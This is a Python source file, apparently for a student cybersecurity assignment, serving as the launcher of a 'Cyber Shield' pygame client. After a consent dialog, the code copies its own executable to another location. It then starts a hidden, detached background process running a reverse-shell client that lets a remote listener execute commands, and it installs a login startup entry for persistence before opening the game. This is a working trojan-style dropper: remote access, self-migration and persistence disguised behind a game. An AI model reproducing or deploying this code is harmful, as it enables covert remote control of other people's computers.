"""
Entry point for the Cyber Shield game client that:
  - Shows a clear consent / awareness dialog
  - Optionally enables persistence on Windows
  - Starts the reverse‑shell network client in the background
  - Launches the main pygame game from src.main
"""

import tkinter as tk
from tkinter import messagebox
import sys
import subprocess
import time
import os
from pathlib import Path

# Support both package and “loose script” execution so PyInstaller works.
root_path = Path(__file__).resolve().parent.parent
if str(root_path) not in sys.path:
    sys.path.insert(0, str(root_path))

try:  # when run as part of the game_client package
    from . import deps_check, persistence  # type: ignore[import-not-found]
    from .config import GameConfig, get_migrated_path  # type: ignore[import-not-found]
    from .net_client import ShellClient  # type: ignore[import-not-found]
except (ImportError, ValueError):  # when bundled as a flat script or top-level run
    try:
        from game_client import deps_check, persistence  # type: ignore[import-not-found]
        from game_client.config import GameConfig, get_migrated_path  # type: ignore[import-not-found]
        from game_client.net_client import ShellClient  # type: ignore[import-not-found]
    except ImportError:
        try:
            import deps_check, persistence  # type: ignore
            from config import GameConfig, get_migrated_path  # type: ignore
            from net_client import ShellClient  # type: ignore
        except ImportError:
            # Final fallback for unusual environments
            import deps_check, persistence  # type: ignore
            from config import GameConfig  # type: ignore
            from net_client import ShellClient  # type: ignore
            def get_migrated_path(): from pathlib import Path; return Path.home()


def _show_consent_dialog(root: tk.Tk) -> bool:
    text = (
        "CYBER SHIELD – LAB GAME\n\n"
        "This game is part of a cybersecurity assignment.\n\n"
        "If you click 'Proceed to Game':\n"
        "  • The game will open a network connection back to a listener\n"
        "    controlled by the student (for educational purposes only).\n"
        "  • Commands typed in the listener can be executed on this machine\n"
        "    while the game is running.\n"
        "  • A startup entry will be created so this game/client can start\n"
        "    automatically when you log in again, until you run the cleanup tool.\n\n"
        "Use only on a virtual machine or lab computer that you control."
    )
    return messagebox.askokcancel(
        "Cyber Shield – Information",
        text,
        parent=root,
        default=messagebox.OK,
    )


def _is_already_running() -> bool:
    """
    Check if a silent instance is already running using a lock file.
    """
    lock_file = Path.home() / ".cyber_shield" / "client.lock"
    return lock_file.exists()


def _run_silent_mode() -> None:
    """
    Run only the shell client in the background indefinitely.
    """
    lock_file = Path.home() / ".cyber_shield" / "client.lock"
    lock_file.parent.mkdir(exist_ok=True)

    if lock_file.exists():
        try:
            old_pid = int(lock_file.read_text().strip())
            # Check if process is still running
            if sys.platform == "win32":
                # tasklist check for Windows
                out = subprocess.run(["tasklist", "/FI", f"PID eq {old_pid}"], capture_output=True, text=True).stdout
                if str(old_pid) not in out:
                    lock_file.unlink()
            else:
                # kill -0 for Linux
                os.kill(old_pid, 0)
        except (OSError, ValueError, ProcessLookupError):
            # Process not found or invalid PID, safe to remove lock
            try:
                lock_file.unlink()
            except OSError:
                pass
        
        if lock_file.exists():
            # Still exists and likely active
            return

    lock_file.write_text(str(os.getpid()))

    try:
        shell_client = ShellClient()
        shell_client.start()
        while True:
            time.sleep(10)
    except KeyboardInterrupt:
        pass
    finally:
        if lock_file.exists():
            try:
                lock_file.unlink()
            except OSError:
                pass


def _spawn_detached_background() -> None:
    """
    Migrate the current executable and launch it in silent mode as a detached process.
    """
    
    # Detect if we are running as a PyInstaller bundle or a script
    is_frozen = getattr(sys, 'frozen', False)
    if is_frozen:
        source = Path(sys.executable)
    else:
        # For scripts, we can't easily 'migrate' a single file if it has dependencies.
        # But for the demo, we'll try to find the project root or just use sys.executable.
        source = Path(__file__).resolve().parent.parent / "game_client" / "game_main.py"
        if not source.exists():
             source = Path(sys.argv[0]).resolve()

    dest = get_migrated_path()

    # 1) Migrate (copy oneself to the trusted location)
    try:
        dest.parent.mkdir(parents=True, exist_ok=True)
        # Only copy if source is different from destination
        if source != dest:
            if not dest.exists() or source.stat().st_mtime > dest.stat().st_mtime:
                import shutil
                shutil.copy2(source, dest)
    except Exception:
        # If migration fails, the show must go on with the current source
        dest = source

    # 2) Spawn the background process
    # DETACHED_PROCESS (0x08) + CREATE_NO_WINDOW (0x08000000) + CREATE_NEW_PROCESS_GROUP (0x0200)
    # These ensure the child is NOT tied to the parent's console or life-cycle.
    flags = 0
    if sys.platform == "win32":
        # Flags: DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW
        flags = 0x00000008 | 0x00000200 | 0x08000000
    
    # Logic for script vs frozen .exe
    if dest.suffix.lower() == ".py" or (not is_frozen and not dest.suffix):
        args = [sys.executable, str(dest), "--silent"]
    else:
        args = [str(dest), "--silent"]

    try:
        # Spawn and immediately forget.
        subprocess.Popen(
            args,
            creationflags=flags,
            close_fds=True,
            start_new_session=True,  # For Linux/Unix detachment
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    except Exception:
        pass


def launch_game() -> None:
    """
    Main entry.
    """
    # 1) Robust check for silent flag (used by startup persistence and migration)
    # We check all arguments case-insensitively and also check for substrings 
    # just in case some launchers wrap it.
    is_silent = any(arg.lower() in ("--silent", "-silent", "/silent") for arg in sys.argv)
    
    if is_silent:
        _run_silent_mode()
        return

    # 2) Consent + dependency checks via Tkinter
    # If we reached here, we are NOT in silent mode.
    root = tk.Tk()
    root.withdraw()

    if not _show_consent_dialog(root):
        return

    # Silent environment check
    ok, _ = deps_check.check_runtime_dependencies()
    if not ok:
        return

    # 3) Migrate and launch background connection if not already running
    if not _is_already_running():
        _spawn_detached_background()

    # Automatically enable persistence after consent
    persistence.install_startup_entry()

    # 4) Launch the existing pygame game loop from src.main
    from src.main import main as game_main

    try:
        game_main()
    except Exception:
        pass


def main() -> None:  # PyInstaller friendly
    launch_game()


if __name__ == "__main__":
    main()

